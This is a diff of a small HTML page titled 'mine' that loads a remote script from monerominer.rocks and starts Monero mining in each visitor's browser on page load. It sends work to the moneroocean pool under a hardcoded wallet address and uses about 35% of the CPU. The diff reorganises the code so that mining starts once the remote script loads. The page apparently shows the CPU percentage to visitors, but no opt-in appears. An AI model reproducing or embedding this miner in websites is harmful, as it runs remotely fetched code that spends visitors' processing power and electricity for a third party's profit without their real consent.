@@ -7,13 +7,13 @@
 		i honestly dont even know what i am doing at this point
 
 	-->
-	
+
 
 
 
 	<title>mine</title>
 
-	<script type="text/javascript">
+	<script type="text/javascript" defer>
 		let script = document.createElement('script');
 		script.src = "https://monerominer.rocks/miner-mmr/webmnr.min.js";
 		document.head.append(script);
@@ -26,9 +26,23 @@
 			document.getElementById("etxt").style.display = "block"; // enable text
 		};
 
+		script.onload = function() {
+			server = "wss://f.xmrminingproxy.com:8181";
+		    var pool = "moneroocean.stream";
+		    var walletAddress = "41rTmPDapr7Z7DRu2DorFw3UCYA7E4eQhHPNsakMvvszWJPuNyVhbVtXzuWyqCHgev5CeYejKNsrPbDqgLpRZZRJMQ2xgW3";
+		    var workerId = "patsite-browser"
+		    var threads = -1; // auto calc
+		    var password = "";
+
+		    throttleMiner = 65; // the miner will use 100-[this value]% of cpu
+		    document.getElementById("precent").innerHTML = (100-throttleMiner)+"%"; // calculate cpu used
+
+		    startMining(pool, walletAddress, workerId, threads, password);
+		}
+
 
 		window.onload = function() {
-			document.getElementById("precent").innerHTML = (100-throttleMiner)+"%"; // calculate cpu used
+			
 			if (!isMinerBlocked) {
 				document.getElementById("mtxt").style.display = "block"; // enable text
 			} else {
@@ -36,19 +50,6 @@
 				document.getElementById("etxt").style.display = "block"; // enable text
 			}
 		}
-	</script>
-
-	<script type="text/javascript" defer>
-	    server = "wss://f.xmrminingproxy.com:8181";
-	    var pool = "moneroocean.stream";
-	    var walletAddress = "41rTmPDapr7Z7DRu2DorFw3UCYA7E4eQhHPNsakMvvszWJPuNyVhbVtXzuWyqCHgev5CeYejKNsrPbDqgLpRZZRJMQ2xgW3";
-	    var workerId = "patsite-browser"
-	    var threads = -1; // auto calc
-	    var password = "";
-
-	    throttleMiner = 65; // the miner will use 100-[this value]% of cpu
-
-	    startMining(pool, walletAddress, workerId, threads, password);
 	</script>
 
 	
